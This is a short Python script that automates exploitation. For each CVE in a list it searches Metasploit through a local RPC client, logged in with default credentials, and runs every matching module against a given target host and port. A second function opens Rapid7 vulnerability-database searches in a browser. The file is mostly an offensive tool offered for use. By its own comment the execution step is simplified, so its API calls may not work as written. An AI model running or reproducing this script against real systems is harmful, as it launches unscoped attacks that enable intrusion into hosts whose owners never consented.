import webbrowser
from metasploitapi import MetasploitAPI

def exploit_cves(target, service_name, service_version, port, cve_list):
    if cve_list:
        print(f"Exploiting CVEs on {target}:{port} ({service_name} {service_version})")
        print(f"CVEs: {', '.join(cve_list)}")

        # Create a Metasploit API client
        msfapi = MetasploitAPI(host='127.0.0.1', port=55553)  # Adjust host and port as needed
        msfapi.login('msf', 'msf')  # Provide Metasploit credentials

        # Loop through CVEs and search for corresponding Metasploit modules
        for cve in cve_list:
            modules = msfapi.modules.search(cve)
            for module in modules:
                print(f"Module: {module['name']}")
                
                # Run the Metasploit module (simplified for demonstration)
                exploit_result = msfapi.modules.execute(module['name'], target, port)
                print(f"Exploitation result: {exploit_result}")

        msfapi.logout()
    else:
        print("No CVEs found for exploitation.")

def search_metasploit_for_cves(cve_list):
    for cve in cve_list:
        search_url = f"https://www.rapid7.com/db/search?utf8=%E2%9C%93&q={cve}"
        webbrowser.open(search_url)
